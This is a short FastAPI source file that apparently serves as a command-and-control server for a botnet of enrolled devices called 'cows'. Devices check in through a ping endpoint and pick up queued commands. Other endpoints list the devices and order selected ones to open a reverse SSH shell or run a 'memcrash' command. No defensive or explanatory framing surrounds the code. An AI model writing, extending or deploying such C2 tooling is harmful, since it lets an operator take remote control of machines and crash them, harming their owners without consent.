from fastapi import FastAPI

app = FastAPI()

clients = {
    "cow1": {"name": "example", "command": "", "status": "online"},
    "cow2": {"name": "example2", "command": "", "status": "offline"}
}

name_to_id = {
    "example": "cow1",
    "example2": "cow2"
}

def newDevice(device_name):
    if device_name in name_to_id:
        return
    cowID = f"cow{len(clients) + 1}"
    clients[cowID] = {"name": device_name, "command": "", "status": "online"}
    name_to_id[device_name] = cowID

def assignCommands(id, command):
    if id in clients:
        clients[id]["command"] = command

@app.get("/ping/{device_name}")
async def ping(device_name: str):
    newDevice(device_name)
    cow_id = name_to_id[device_name]
    return {"status": "ok", "command": clients[cow_id]["command"], "ID": cow_id}

@app.get("/command/listcows/")
async def listcows():
    data = [(id, info["name"]) for id, info in clients.items()]
    return {"cows": data}

@app.get("/command/ssh/{cowID}")
async def terminal(cowID):
    assignCommands(cowID, "reverseSSH")
    return{"status":"ok"}

@app.get("/command/memcrash/{cowID}")
async def terminal(cowID):
    assignCommands(cowID, "memcrash")
    return{"status":"ok"}
